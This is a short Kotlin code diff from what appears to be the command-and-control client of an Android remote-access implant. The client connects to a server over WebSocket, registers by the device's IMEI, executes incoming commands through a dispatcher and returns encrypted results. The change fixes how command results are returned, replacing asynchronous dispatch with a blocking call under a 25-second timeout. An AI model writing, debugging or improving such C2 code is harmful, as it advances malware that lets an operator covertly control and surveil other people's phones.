@@ -33,17 +33,19 @@ object C2Coordinator {
         ws = WebSocketTransport(
             serverUrl = serverUrl,
             onCommand = { cmd ->
-                // NON-BLOCKING: dispatch coroutine on IO scope, send result when ready.
-                // Avoids runBlocking which starves the OkHttp WebSocket callback thread.
-                scope.launch {
-                    val raw = CommandDispatcher.dispatch(
-                        Json { ignoreUnknownKeys = true }
-                            .encodeToString(Command.serializer(), cmd)
-                    )
-                    ws?.send(CryptoEngine.encrypt(raw))
+                // Dispatch synchronously with timeout to avoid blocking WS thread forever
+                kotlinx.coroutines.runBlocking {
+                    val deferred = scope.async {
+                        CommandDispatcher.dispatch(
+                            Json { ignoreUnknownKeys = true }
+                                .encodeToString(Command.serializer(), cmd)
+                        )
+                    }
+                    val result = kotlinx.coroutines.withTimeoutOrNull(25_000) {
+                        deferred.await()
+                    } ?: "{\\\"type\\\":\\\"ErrorResponse\\\",\\\"error\\\":\\\"dispatch_timeout\\\"}"
+                    CryptoEngine.encrypt(result)
                 }
-                // Return empty placeholder immediately — real result sent async.
-                CryptoEngine.encrypt("")
             },
             onStatus = { status -> Log.d(TAG, "WS: $status") }
         ).also { it.connect(imei) }
